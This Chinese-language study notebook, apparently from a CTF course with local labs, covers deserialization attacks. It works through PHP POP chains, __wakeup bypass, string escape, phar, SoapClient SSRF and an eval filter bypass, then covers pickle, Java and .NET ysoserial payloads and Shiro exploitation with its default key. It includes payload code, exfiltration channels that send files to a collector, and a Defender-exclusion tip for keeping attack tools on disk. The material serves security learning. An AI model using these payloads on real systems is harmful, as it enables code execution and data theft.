## 1. serialize 格式速认（L1 ✓2026-08-30）

| 标记 | 类型 | 样子 |
|------|------|------|
| s | 字符串 | s:5:"hello";（长度=字节数，中文每字 3 字节） |
| i / b / d | 整数/布尔/浮点 | i:18;  b:1;  d:3.14;（裸值，无引号无长度） |
| N | NULL | N; |
| a | 数组 | a:2:{键;值;键;值;}（**索引数组也有 i:0; i:1; 键**） |
| O | 对象 | O:6:"Person":2:{s:4:"name";s:3:"Tom";s:3:"age";i:18;} |
| R/r | 引用 | R:1;（指向已出现过的值） |
| C | 自定义序列化 | C:类名长度:"类名":... |

**铁律**：错一个字符 = 整串作废（unserialize 返回 false，你 L1 亲眼见过 bool(false)）。
**可见性前缀**：protected 属性名 = `\0*\0名`；private = `\0类名\0名`——空字节算长度（实弹：`s:4:"\0*\0x"`）。

## 2. unserialize 行为四条（L2 ✓2026-08-30）

1. 对象**照单重建**：属性值串说了算，类里默认值只是兜底（实弹：$cmd 串写 id 还原就是 id）；
2. **构造函数 `__construct` 不执行**——出生检查全被绕过（实弹：[出生C] 缺席）；
3. `__wakeup` 还原完成自动跑；`__destruct` 对象销毁自动跑（不管对象怎么来的）；
4. 失败返回 false，解析错位不报"你哪里错了"，只表现为"下游空了"。

## 3. 魔术方法地图（L3 ✓2026-08-30）

| 时刻 | 钩子 | 反序列化里的角色 |
|------|------|-----------------|
| 还原完成 | __wakeup | **自动起爆点①** |
| 对象销毁 | __destruct | **自动起爆点②** |
| 对象被当字符串（echo/拼接） | __toString | **头号跳板**（一次 . 拼接就触发） |
| 读不存在的属性 | __get | **跳板**（demo：echo $o->nothere → [你想拿不存在的属性 nothere]） |
| 写不存在的属性 | __set | 跳板 |
| 调不存在的方法 | __call | 跳板 |
| 对象被当函数 $o() | __invoke | 跳板（$new() 这种写法触发） |
| 克隆 | __clone | 知道即可 |

## 4. POP 链拼装流程（L4 ✓2026-08-30）

```
① 找起爆点：__wakeup / __destruct（不用触发就自动跑）
② 看起爆点动了谁的属性：属性被"当字符串用"→ __toString；被"当函数调用"→ __invoke；
   被"读不存在属性"→ __get；被"调不存在方法"→ __call
③ 跳板的属性继续塞对象，一环环走到武器（system/include/eval/file_get_contents...）
④ 属性值可以是嵌套对象：串里 O:... 里再嵌 O:...
```

**读链模板**（两环最小链，✓2026-08-30 实弹）：
```php
class FileCat { public $file; function __destruct(){ echo file_get_contents($this->file); } }
unserialize('O:7:"FileCat":1:{s:4:"file";s:10:"/tmp/t.txt";}');
// 脚本结束 → __destruct → 读 $file 指的文件。攻击者只提交了一串字符。
```

## 6. __wakeup 绕过 ✓(2026-09-01)
========================================================

**场景**：目标在 `__wakeup` 里消毒危险属性（还原瞬间重置成安全值）。

**招式**：串里**属性个数虚报 +1**，其余一字不动：
```
正常: O:5:"Vault":1:{s:6:"target";s:11:"flag_l6.txt";}
篡改: O:5:"Vault":2:{s:6:"target";s:11:"flag_l6.txt";}
                 ↑ 只改这一个数字
```

**版本前提**（CVE-2016-7124）：PHP < 5.6.25 或 7.0.x < 7.0.10。现代版本上虚报 = 整串报废（unserialize 返回 false，对象根本不物化）--**打题先探版本**（phpversion()）。

**机理**（2026-09-01 实弹确认）：wakeup 是**成功路径专属**钩子；虚报使解析中途失败，但对象已物化、属性已装好，失败路径销毁对象时 destruct 照样开火。**回显症状：武器输出 + 「unserialize 返回 false」并存**。

**弹药要照靶改**（2026-09-01 实证）：类名/类名长度/属性名/属性名长度，四样全对上靶场代码--抄演示的弹药打靶（S/f 打 Vault）= 寄错门牌，靶场只回一行 false。

**练习靶**：PHP 7.0.9 老靶机（D:\deepseek\php709\，Windows 官方归档二进制）+ 内置服务器 127.0.0.1:8090（l6-vault）。

## 7. 字符串逃逸 ✓(2026-09-01)
========================================================

**场景**：过滤器夹在 serialize 和 unserialize 之间——`unserialize(filter(serialize($obj)))`。长度声明（数字）是序列化时算的，内容（字节）是过滤器改的 → **声明说谎**。

**两种题型先分清**（2026-09-01 学员实证踩坑）：
| 服务器代码 | 你发什么 |
|-----------|---------|
| `unserialize($_GET['d'])` | 整条序列化串（web3.php 型） |
| `unserialize(filter(serialize($obj)))` | **只发属性内容**（井号+注入串），外层包装服务器造 |

**变长逃逸**（过滤器让内容变长，如 `#`→`##`）：
```
注入串: ";s:LEN:"属性名";b:1;}      LEN = 属性名字节数
填充数 = 注入串长度
算术心脏: 解析器读 K+L 格(提交时定死) = 井号膨胀后占 2K 格 → K+L=2K → K=L
膨胀率迁移: 一变三时 K+L=3K → K=L/2（公式会迁移，口诀不会）
```
注入的 `}` 提前关对象，原装尾巴全部作废（unserialize 收工后不理尾随垃圾）。

**变短逃逸**（内容缩水）：声明比内容长 → 解析器越界吞字节（连闭引号都吞进值里）；真题经典形态是**双输入位**（第一个输入缩水吞掉边界，第二个输入的结构顶上来）。

**坑清单**（2026-09-01 全部实证）：
- **栅栏问题**："注入在第 2K+1 位"是**位置**，"读 K+L 格"是**数量**——位置别跟数量配对；多垫一个填充字符 = 读数差一格 = 哑弹
- 浏览器地址栏 `#` 是锚点分隔符，后全砍——必须 `%23`
- Burp：别把整行请求（含 HTTP/1.1）粘进 URL 栏，尾巴会粘进 payload
- URL 编码别把 `=` 也编了（`user%3d...` = 参数名整个没了）
- 判定成败看响应**最底部**（源码高亮块占顶，战果行缩底）——"打穿了但没看见"也是一坑
- **数长度数两遍**：教练验靶数错 21/22 一发哑弹——填充类攻击的命根子是数字节

**练习靶**：127.0.0.1:8091（lab-scaffold/l7-escape/：demo 变长 / demo2 变短 / account 挑战）

## 8. phar 反序列化 ✓(2026-09-01)
========================================================

**概念**：phar = PHP 压缩包格式；其 **metadata 字段存序列化数据**；任何文件函数打开 `phar://` 流 → **自动反序列化 metadata**，全程没有一个 unserialize() 调用 = 暗门。

**管道家族表**（路径前缀决定走哪条管道——都是老相识）：

| 路径前缀 | 管道 | 课程出处 |
|---------|------|---------|
| 无前缀/盘符 | 磁盘文件 | - |
| `php://filter/...` | 过滤器管道 | L5 读源码 |
| `data://...` | 数据管道 | L5 伪协议 RCE |
| `phar://...` | **phar 档案馆，进门必拆封 metadata** | L8 |

**触发面**（30+ 文件函数全认 phar:// 地址）：`file_exists`（领衔，看似最无害）/ `is_file` / `is_dir` / `filesize` / `fopen` / `file_get_contents` / `md5_file` / `copy` / `unlink`……**函数不挑 phar，是用户可控的地址前缀改的道**。

**造弹模板**（本地需 `-d phar.readonly=0` 执照，靶机不需要）：
```php
$o = new 靶类; $o->属性 = 弹头;
$phar = new Phar(__DIR__ . '/evil.phar');
$phar->startBuffering();
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER(); ?>');   // GIF 头过文件检查
$phar->setMetadata($o);
$phar->addFromString('pad.txt', 'x');                        // 至少一个文件
$phar->stopBuffering();
```

**引爆链**：造弹 → 上传（文件名随意，内容 GIF89a 开头过检）→ `?check=phar://绝对路径/evil.gif`（URL 里用**正斜杠**）。

**不知道旗在哪**：phar 只管**运送**，武器由靶子的类决定——靶类若是 `system($cmd)`，metadata 装 `cmd='ls /'` 先探路再取旗（php-batch 侦查思想直接复用）。

**坑**（2026-09-01 实证）：先跑 builder 再上传（curl 26 = 弹没造出来）；target 填**文件名**不是目录；Windows 路径在 phar:// 里写正斜杠。

**练习靶**：127.0.0.1:8092（lab-scaffold/l8-phar/：demo 演示 / index 挑战 / build_phar 工坊）。

## 9. 原生类武器：SoapClient SSRF / Error 回显 ✓(2026-09-02)
========================================================

**概念**：目标一个自定义类都没有时，unserialize 照样收 **PHP 自带类（原生类）**——它只认"类名存在"，不管类是谁写的。但 unserialize 有**收货名单**：只收实现了序列化协议的类。

**收货名单**（PHP 7.0.9 实测 2026-09-02）：

| 类 | 收吗 | 武器价值 |
|---|---|---|
| SoapClient | ✅ | ⭐⭐⭐ `__call` → SSRF（主武器）|
| Error / Exception | ✅ | ⭐⭐ `__toString` → 回显/XSS |
| stdClass | ✅ | 零（一个魔术方法都没有，纯占位）|
| SplFileObject / GlobIterator / DirectoryIterator / SimpleXMLElement | ❌ 拒收 | serialize 抛 "not allowed"，手搓串也只吐 false |

**武器一 Error（回显炸弹）**——echo 触发 `__toString`，message 是你塞的：
```php
$payload = serialize(new Error('<script>alert(1)</script>', 42));
// O:5:"Error":7:{s:10:"\0*\0message";s:25:"<script>...";...}
$obj = unserialize($payload);
echo $obj;   // 吐出：Error: <script>alert(1)</script> ... —— <script> 裸进 HTML = XSS
```
注意：protected 属性带 `\0*\0` 前缀（不可见字节）→ **裸串没法 URL 直传**（urlencode 成 %00 后畅通，见 9.5），打"网页回显点"时无此顾虑。

**武器二 SoapClient（SSRF）**——调它任何不存在的方法，`__call` 就把方法名包成 SOAP 请求 POST 到 `location`：
```php
$payload = serialize(new SoapClient(null, array(
    'uri'      => 'http://目标/',           // 命名空间（形式主义，随便填）
    'location' => 'http://目标/接口.php',   // ← 请求打到这里（地址你定）
)));
// O:10:"SoapClient":3:{s:3:"uri";s:22:"http://...";s:8:"location";s:33:"http://...";s:13:"_soap_version";i:1;}
$obj = unserialize($payload);
$obj->任何方法名();   // -> __call -> 一发 POST 已飞向 location
```
- **攻击意义 = 借手开火**：只要代码碰到 SoapClient 的方法调用，服务器就替你发请求（SSRF）；服务器够得着的内网你就够得着
- **无 \0 字节**，URL 直传无障碍（跟 Error 弹相反）
- **回程信道**：对端用 SOAP Fault 回话 → SoapClient 抛异常 → `getMessage()` = faultstring 内容——**旗坐异常的车回来**

**发射**（8093 靶场实弹验证的两条路）：
- 浏览器表单：把整串弹药贴进提交框（最省事）
- CMD：用工坊打出来的 curl 行（payload 已 urlencode，串里无裸引号，CMD 安全）：`curl "http://127.0.0.1:8093/?d=O%3A10%3A%22SoapClient%22..."`

**故障签名**（2026-09-02 实证）：SoapFault `Could not connect to host` = 弹药里 location 指的地址**没机器应门**（TCP 层失败；403 是"应门了但拒绝你"）——核对 location 是不是真地址。

**练习靶**：127.0.0.1:8093（挑战"体检中心"）/ 8094（内网机器，只吃 SOAP：POST + text/xml）/ lab-scaffold/l9-native/（build_soap.php 工坊）。

## 9.5 Error 三重门 + eval 边界戏法（greatphp 实战）✓(2026-09-07)
========================================================

**题型指纹**（P2300 [极客大挑战 2020]greatphp，NSSCTF 69 分真题实弹到旗）：

```php
($syc != $lover) && (md5($syc) === md5($lover)) && (sha1($syc) === sha1($lover))
    && !preg_match("/\<\?php|\(|\)|\"|\'/", $syc)  →  eval($syc)
```

两个值不等 + 两重指纹全等 + preg 禁括号引号 + eval 收尾。**三条路的死活**（全实测）：

| 路 | 死因 |
|---|---|
| 字符串（不同串同指纹）| 哈希碰撞不可造（同串则 != 先死）|
| 数组 | md5 拒收退 NULL 过了第一关，但 eval 强转写死的 "Array" → 语法死 |
| **Error 对象** | **唯一活口** ✅ |

**核心机理（PHP 7.0.9 实测 2026-09-07）**：

- `md5(对象)` / `sha1(对象)` **不拒收**——拉 `__toString` 变形后照单全收（拒收退 NULL 的是数组）
- 两个 Error：**消息相同 + code 一个 1 一个 2 → 本体不同（!= ✓）且变形结果一字不差（指纹全等 ✓）**
- **必须同一行构造**（`foreach ([1,2] as $c) $pair[] = new Error($msg, $c);` 一行装俩）：变形结果里印着出生文件:行号，不同行出生 = 指纹不同 = 门死
- 验证一发（三 bool 全真 = 过门证明）：
```php
var_dump(new Error('X',1) != new Error('X',2), md5(new Error('X',1)) === md5(new Error('X',2)), sha1(new Error('X',1)) === sha1(new Error('X',2)));
```

**eval 边界戏法**（消息住在废话正中间）：

- 变形结果全貌：`Error: 【消息】 in 文件:行号` + Stack trace——**整串全被当代码编译**
- 弹药三标记：`?>` 关代码模式（开头的 `Error:` 恰好站成 goto 标签语法）→ `<?=` 短标签开门就喊 → 尾部 `?>` 再关（后面全惰性文字）
- 读文件版弹药消息：`?><?=include $_GET[1]?>` —— include 是语言构造**不要括号**，路径走 URL `&1=/flag` **不要引号**

**信道适配（当日实弹两连）**：

- 反引号 `` `cmd` `` = shell_exec 的化名，**全 PHP 唯一无括号 shell 门**——但平台 disable_functions 常焊死它。症状：eval 活着（尾巴照打印）、输出零（shell 没跑）→ 焊死证据
- 焊死后换 **include 读文件通道**；旗在 .php 里用 L5 老家伙：`&1=php://filter/read=convert.base64-encode/resource=/flag`
- 可选侦察：`&1=/usr/local/etc/php/php.ini` 亲眼看 disable_functions 焊点

**工坊坑（实弹）**：PHP 源码**注释里写 `?>` 会真的关掉 PHP 模式**（词法器不看注释内容）——弹药标记只准出现在字符串里。

**战利品**：greatphp-test/test_greatphp.php（题目复刻靶 + 弹药工坊 + URL_READY 发射器，空字节自动 %00）。

## 10. PHPGGC：反序列化弹药工厂 ✓(2026-09-03)
========================================================

**概念**：流行库的 POP 链弹药库（几百条现成链）。真实目标的反序列化点背后是流行库的类（Monolog/Laravel/Guzzle...），属性几十个、继承三四层，手搓不现实——工厂已量产。

**工厂三步**：

| 步 | 动作 | 要点 |
|---|------|------|
| ① 认库 | 侦查目标用什么库什么版本 | composer.lock 泄露 / 报错页 / 框架指纹 |
| ② 选链 | `phpggc -l` 对表 | **三格比对**：名字（编号按库各自排，不跨库通用）/ 版本（**上限也要比**；分段区间每段都看；逐条扫别跳行）/ 类型（RCE/文件写/SSRF——范围=能装，类型=对口） |
| ③ 生成 | `php phpgc -b 库/链 函数 参数` | `-b` = base64（protected 属性的 \0 进不了文本世界——**运输包装**，靶面配套 decode 是被弹药需求倒逼的） |

**本机装备**：工厂 `D:\deepseek\phpggc\`，跑工厂用 `D:\php\php.exe`（PHP 8.5——php709 解析不动工厂的现代语法；**生成弹药与靶机 PHP 版本无关**，工厂只造串）。

**版本区间读法**：`1.17.2 <= 2.7.0+` = 1.17.2~2.7.0（含）中招；版本分段=库的纪元（Monolog 老链 RCE1~7 全止步 2.7.0，2.8 修复；RCE8/RCE9/FW1 是 3.0~3.1 新纪元的链——2.8~2.9 是空档，无链可用）。

**Monolog/RCE1 链解剖（六跳，真库源码复走过）**：`__destruct → close() → $this->socket->close()`（socket 偷换成 BufferHandler）`→ flush() → handleBatch → handle → processors 循环`：`current` 把 record 数组降级成字符串、`system` 接力开火（**双段诡计**：一个属性位塞两个函数接力）；`r:2` = handler 自引用（L4 跳转计数知识直接用）。

**门关了怎么办**：版本全对不上 = 此库此路不通 → 换攻击面（别的库/别的漏洞类型/别的入口）；实战注：版本范围=已验证范围，界外未验证，急了可赌一发。

**练习靶**：127.0.0.1:8095（l10-phpggc：真库 vendor 树 + 泄露的 composer.lock + base64 导入点，考点=无方法调用、对象自然谢幕时 `__destruct` 开火）。

## 跨语言区

### L11 pickle（Python）✓(2026-09-03)

**概念**：pickle 协议本身 = **重建指令流**——`loads` 是一台小虚拟机，**谁控制字节流谁控制执行**；危险内建在协议里，**不需要目标有任何类**（跟 PHP 最大差异：PHP 弹要"借"目标类的魔术方法，pickle 弹自带起爆器）。

**弹药（`__reduce__` = 自带引信）**：
```python
import pickle, base64, os
class Shell:
    def __reduce__(self):
        return (os.system, ('whoami',))     # (函数, 参数) —— loads 时直接 函数(*参数)
payload = base64.b64encode(pickle.dumps(Shell())).decode()   # 字节流 -> base64 运输
```

**回显信道 = `__reduce__` 里那个函数的返回值**（它就是"反序列化出来的对象"，靶面 repr 回显它）：
- `os.system` 型：输出去**服务器控制台**，回显只剩退出码 `0`——"弹响了但你瞎了"
- `eval` 型：`(eval, ('表达式',))`——表达式的值直接变成对象，repr 回显；拿旗用读文件表达式
- 同族思想：L9 Fault 信道、SQL 报错信道——打进只算一半，**让结果走到你眼前**才算完

**找靶**：跟 PHP 一模一样——用户数据流进 `pickle.loads` = 攻击面（会话/缓存/配置导入都是高发区）。

**练习靶**：127.0.0.1:8096（l11-pickle：TodoLite 会话恢复 + repr 回显）。

### L12 Java ✓(2026-09-03)

**概念**：`ObjectInputStream.readObject()` = unserialize 的镜像。弹药同样要"借手"，手长在 **classpath 依赖库**里（跟 PHP 借 vendor 的类同义）；Java 钩子不叫魔术方法，叫 `readObject`/`hashCode` 这族回调——名字不同角色一样。

**指纹（三世界弹药一辨）**：Java `AC ED 00 05`（base64 后 **`rO0AB`**）/ Python pickle `gASV` / PHP `O:`。

**三角色卡**：**手** = commons-collections（可借的类，自己不知道是武器）/ **工厂** = ysoserial（把手串成链、造成弹药）/ **弹药** = 序列化串。找手是侦查（报错堆栈、classpath、页面情报），造弹是工厂活——两步两个工具不混用。

**工装（Java 21 实测）**：
```
java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED -jar D:\deepseek\ysoserial-all.jar CommonsCollections6 "cmd /c 命令" > evil.bin
python -c "import base64;print(base64.b64encode(open('evil.bin','rb').read()).decode())"
```
- `--add-opens`：给老工厂开新 Java 的模块锁（签名 `InaccessibleObjectException` = 该开锁）；**生成侧需要，靶机引爆不需要**
- 无参数跑 ysoserial = 链清单（对表三格同 PHPGGC）；CC1 在新 JDK 是著名哑弹——哑弹换下一条是标准操作
- `Runtime.exec` 直 spawn **不经 shell**：copy/type/dir 等 cmd 内建命令要 `cmd /c` 包
- base64 转换一律 `'rb'` 二进制读（Windows 文本模式换行转换会改坏字节流）

**无回显 → 造信道（两段式）**：链终点 Runtime.exec 的输出落服务器进程 stdout，响应里没有——让命令把目标**搬进 web 可访问目录**（`cmd /c copy flag.txt webroot\x.txt`），再 GET 取回。与 L9 Fault 信道 / L11 返回值信道同族：**打进只算一半，运回来才算完**。

**弹道自查三步**（取不到货时）：① POST 回显签名（"导入 HashSet"=弹响 / "导入失败 xxx"=弹药问题）② 落盘区有没有货 ③ 再 GET 一次（浏览器不自动重查旧地址）。

**练习靶**：127.0.0.1:8097（l12-java：CC 3.1 classpath + webroot 落盘区）。

### L13 .NET ✓(2026-09-04)

**概念**：`BinaryFormatter.Deserialize()` = 第四面镜子。**.NET 的手长在框架本体**（SortedSet/委托系统自带）——区别于 Java 要 classpath 挂库、PHP 要 vendor 有类；零依赖门槛是当年 ViewState 漏洞横扫 IIS 的根因。

**指纹收官（四世界）**：PHP `O:` / Python `gASV` / Java `rO0AB` / **.NET `AAEAAAD/////`**。

**工装（实测）**：
```
D:\deepseek\ysoserial-net\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c 命令"
```
- `-g` 选 gadget；`-f` 选 formatter（**口径**：靶子用 BinaryFormatter 就 -f BinaryFormatter，壳必须配枪口）
- **工厂直接吐 base64，别再编一层**——双重编码尸检签名：SerializationException 开头字节 `41-41-45` = ASCII "AAE"
- 无回显 → 两段式落盘（L12 同款）；**Process.Start 异步开火：POST 后等 1~2 秒再取货**（立刻 GET = 404 假哑弹）

- **Defender 会吃攻防工具**（本地攻防日常）：管理员加窄域排除 `Add-MpPreference -ExclusionPath '目录'`，完事可 Remove 收回

**练习靶**：127.0.0.1:8098（l13-dotnet：DotNetKeeper + webroot 落盘区）。

### 实战复现：Shiro rememberMe（CVE-2016-4437，vulhub 首战）✓(2026-09-05)

**rememberMe 结构**：`base64( IV + AES-CBC(序列化对象) )`。服务器拆包三步 = **base64 解码 → AES 解密 → 反序列化**；你的包装就是这三步**倒放**（弹 → 上锁 → 运单）。默认 key `kPH+bIxk5D2deZiIxcaaaA==` 写死在源码 = **没锁**（密码学铁律：方式公开无罪，**钥匙保密才是命**；1.2.4+ 改随机 key → 攻击死在服务器解密层——真实打法带 key 爆破环）。

**弹药**：ysoserial **CommonsBeanutils1**（手 = shiro 自带 commons-beanutils 依赖）；生成命令要 `--add-opens` ×5（含 **java.xml 两把**——TemplatesImpl 住那）。

**发射**：`POST /doLogin` 带 `-b "rememberMe=<甲值>"`（值直接粘贴，CMD 行长够用；Burp 加 Cookie 头同效）。

**信道家族表（信道选择跟着环境走）**：

| 信道 | 出处 | 适用场景 |
|---|---|---|
| OOB 外带（靶机 curl 回连） | ci1 | 有命令执行 + 有 curl |
| JS 外带（new Image + 收集器） | xs4 | 目标是浏览器 |

| 落盘两段式（copy + GET 取回） | L12 | 无回显 + 有 web 目录 |
| **curl --data @文件 直寄收货器** | **Shiro** | **无回显 + 无 web 目录**（Spring Boot 单 jar）——`--data @文件` = 整个文件当 POST 体，一个命令不需要 shell |

## 防御 + 坑清单
- **坑1**：拼串先验串——长度错/格式错的表现是"下游空了"，不是报错提示你哪里错（L4 实弹：s:14→s:10）
- **坑2**：串可以把属性**覆盖成任意类型**——类里默认 array() 的属性，串给它标量，就制造"数组操作全部失败"的机关（web3 EEE）
- **坑3**：error_reporting(0)/@ 是 PHP 层机关的隐身衣——警告静默 = 布尔信道成立
- **坑4**：CMD 直连容器 php 时注意 Git Bash 的路径转换（MSYS_NO_PATHCONV=1）
- **坑5**（2026-09-01 实证）：eval 的弹药必须是**完整 PHP 语句**——`system("whoami")` 少尾分号 = PHP7 抛 ParseError 脚本当场暴毙；error_reporting(0) 环境下连报错都看不见 = 纯静默哑弹。写武器字符串，末尾分号先落
- **坑6**（2026-09-01 实证）：PHP 函数自动类型转换——`md5(213)` 先转 "213" 再算，`i:213` 和 `s:3:"213"` 过同一道 md5 门；手写串时整数/字符串形态有时不敏感，但别赌，默认按目标代码期望的形态写
- **坑7**（2026-09-01 实证）：PHP 内置服务器（php -S）脚本跑完即**改回启动时 CWD**，关闭期触发的析构里相对路径读取会静默扑空--destruct 里读文件一律 `__DIR__ . '/' . 路径`；附带：unserialize 失败路径的析构在**调用内**触发（比脚本期还早）
- **坑8**（2026-09-02 实证）：unserialize 有收货名单——只收实现了序列化协议的类；SplFileObject/GlobIterator/DirectoryIterator/SimpleXMLElement 的 serialize 直接抛 "Serialization not allowed"，手搓串喂进去也只吐 false，别在这几个类上浪费弹药
- **坑9**（2026-09-02 实证）：SoapClient 弹药里的地址**写 IP（127.0.0.1）别写 localhost**——Windows 下 localhost 可能先解析成 IPv6 `::1`，服务只听 IPv4 时照样 "Could not connect to host"；同一签名也出现在端口写错/目标机器没开，先核对 location
- **坑10**（2026-09-03 实证）：**货架列表别截断着下结论**——`phpggc -l` 管道 head 截断后教练断言"Monolog 只有 6 条链"，学员全量实跑打脸（实为 10 条：FW1+RCE1~9）；列表型结论必须全量核对再落笔
- **坑11**（2026-09-03 实证，坑7 复发）：php -S 关闭期析构的 CWD 回**启动目录**而非 docroot——RCE 里相对路径命令（`type flag_l10.txt`）静默扑空；修法二选一：启动加 `-WorkingDirectory` 指到靶场目录（保住"自然谢幕"题设），或命令用绝对路径
- **坑12**（2026-09-03 实证）：**真库有依赖**——Monolog 需要 psr/log，搭靶只拷主库 → unserialize 静默死（`Interface 'Psr\Log\LoggerInterface' not found`）；看 composer.lock 的 require 段拿全依赖清单再拷
